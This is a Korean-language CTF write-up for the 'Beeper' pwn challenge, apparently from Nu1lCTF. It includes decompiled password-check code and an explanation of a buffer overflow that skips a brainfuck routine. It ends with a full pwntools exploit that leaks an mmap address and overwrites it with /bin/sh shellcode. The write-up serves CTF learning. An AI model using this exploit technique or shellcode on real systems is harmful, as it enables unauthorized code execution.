# [Pwn] Nu1lCTF - Beeper

## Description

N/A

## Analysis

문제를 처음 실행하면 패스워드를 입력해야 한다.

password의 경우 sub_EAA()에 존재한다.

```c
signed __int64 sub_EAA()
{
  signed int i; // [rsp+Ch] [rbp-54h]
  int password[18]; // [rsp+10h] [rbp-50h]
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("password:");
  *(_BYTE *)qword_2029F8 = 0;
  *(_BYTE *)qword_202A00 = 0;
  fgets(input_password, 2000, stdin);
  qword_2029F0 = qword_2021E8;
  brainFuck((__int64)&bf_data);
  idx = 0;
  password[0] = 0x86;
  password[1] = 0x13;
  password[2] = 0x81;
  password[3] = 9;
  password[4] = 0x62;
  password[5] = 0xFF;
  password[6] = 0x44;
  password[7] = 0xD3;
  password[8] = 0x3F;
  password[9] = 0xCD;
  password[10] = 0x19;
  password[11] = 0xB0;
  password[12] = 0xFB;
  password[13] = 0x88;
  password[14] = 0xFD;
  password[15] = 0xAE;
  password[16] = 0x20;
  password[17] = 0xDF;
  for ( i = 0; i <= 17; ++i )
  {
    if ( password[i] != (unsigned __int8)input_password[i] )
      return 0LL;
  }
  return 1LL;
}
```

하지만 brainFuck(이하 bf)함수를 보면 bf_data의 값이 null이 될때까지 반복을 하여 패스워드가 변경된다.

```c
  while ( *(_BYTE *)(idx + bf_data) )
  {
    v1 = *(char *)(idx + bf_data);
    switch ( (unsigned int)off_1710 )
   ...
```

다행히도 fgets에 의해 입력 받는 값이 bf_data의 주소까지 덮을 수 있었으며, bf_data의 값을 \x00으로 덮으면 bf 함수를 수행하지 않아 패스워드를 그대로 사용할 수 있게 된다.

```
parallels@ubuntu:/media/psf/Home/writeup/ctf/nictf$ (python -c 'print "\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf"+"1"*(112-18)+"\x00"';cat) | ./beeper
Homura Beeper,plz login!
password:
welcome!
1.Show the message.
2.Remove the message.
3.Buy a cell phone.
4.Logout.
choice>>
```

또한 main문 처음의 함수에서 shellcode를 mmap에 의해 할당된 영역에 붙여 넣는 것을 확인할 수 있다.

```c
unsigned __int64 sub_FF4()
{
  unsigned __int64 v0; // ST08_8
  unsigned int v1; // eax
  int v2; // eax

  v0 = __readfsqword(0x28u);
  qword_2029F8 = (__int64)malloc(4uLL);
  qword_202A00 = (__int64)malloc(4uLL);
  v1 = time(0LL);
  srand(v1);
  v2 = rand();
  gotohere = (char *)mmap(
                       (void *)(((v2 + 16) << 12) + (unsigned int)((unsigned int)((v2 + 16) << 12) >= 0xFFFFFFFF)),
                       0x1000uLL,
                       7,
                       50,
                       -1,
                       0LL);
  strcpy(gotohere, shellcode);
  qword_2021E8 = (__int64)input_password;
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  return __readfsqword(0x28u) ^ v0;
}
```

이제 메뉴의 기능을 확인해보자.

1. Show the message.
   -  메시지의 내용을 확인한다.
2. Remove the message.
   *  메시지를 제거한다.
3. Buy a call phone.
   *  mmap으로 할당된 주소를 실행한다.
   *  bad hacker라는 문구가 출력된다.
4. Logout.
   *  패스워드를 다시 입력할 수 있다.

공격 시나리오는 다음과 같다.

1. 1번과 2번을 통해 mmap 주소를 릭
   *  예) 1번 해제->2번 해제->1번 해제 후 1번 메시지 내용 확인
2. 4번 메뉴를 이용해 mmap 주소의 쉘 코드를 /bin/sh의 쉘코드로 변경(bf함수 이용)
3. Profit!

## Exploit

```python
from pwn import *

r = process('./beeper')

s = lambda x:r.send(str(x))
sl = lambda x:r.sendline(str(x))
c0 = lambda : r.recvuntil('>>')
c1 = lambda : r.recvuntil('remove?')
c2 = lambda : r.recvuntil(', number:')

password = "\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf"
password += "1"*(112-18)
password += "\x00"

r.recvuntil('password:')
sl(password)
c0()

# Leak Mmap Address
sl(2)
c1()
sl(1)
c0()
sl(2)
c1()
sl(2)
c0()
sl(2)
c1() 
sl(1)
c0()

# Leak Mmap Address in 1
sl(1)
c2()
sl(1)
r.recvuntil('number:')
mmap_address = u64(r.recvuntil('\n').replace('\n',''))
log.success('Mmap Address : %s'%(hex(mmap_address)))

# Overwrite Mmap Address using brainfuck.
new_data = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
ori_data = (p64(0x2434810120646f68)+p64(0x7975b84801010101)+p64(0x48506f6870206120)+p64(0x20746f6e206e61b8))[:len(new_data)]

for idx in range(0,4):
    c_new_data = new_data[11*idx:11*(idx+1)]
    c_ori_data = ori_data[11*idx:11*(idx+1)]
    c0()
    sl(4)
    payload = "\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf" # Password
    payload += "1"*(104-18) # Dummy
    payload += p64(mmap_address+idx*11) # Target
    bf = ''
    for (i,j) in zip(c_new_data,c_ori_data):
        if ord(i) > ord(j):
            bf += 'm'*(ord(i)-ord(j))+'h'
        elif ord(i) < ord(j):
            bf += 'u'*(ord(j)-ord(i))+'h'
        else:
            bf += 'h'
    payload += bf
    payload += "\x00" # End
    r.recvuntil('password:')
    sl(payload)

r.interactive()
```



